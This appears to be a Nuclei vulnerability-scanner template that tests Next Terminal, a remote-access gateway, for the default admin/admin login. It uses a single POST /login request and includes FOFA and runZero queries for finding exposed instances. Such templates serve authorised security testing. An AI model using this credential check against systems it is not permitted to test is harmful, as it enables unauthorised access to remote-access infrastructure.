id: next-terminal-default-login
info:
  name: Next Terminal - Default Login
  author: ritikchaddha
  severity: high
  description: |
    Next Terminal default login was discovered.
  reference:
    - https://github.com/dushixiang/next-terminal
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)Next Terminal"})
    fofa-query: title="Next Terminal"
    max-request: 1
    verified: true
  tags: default-login,next,next-terminal,vuln
http:
  - attack: pitchfork
    matchers:
      - condition: and
        part: body
        type: word
        words:
          - message":"success
          - code":1
          - data":"
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      password:
        - admin
      username:
        - admin
    raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}","remember":false}
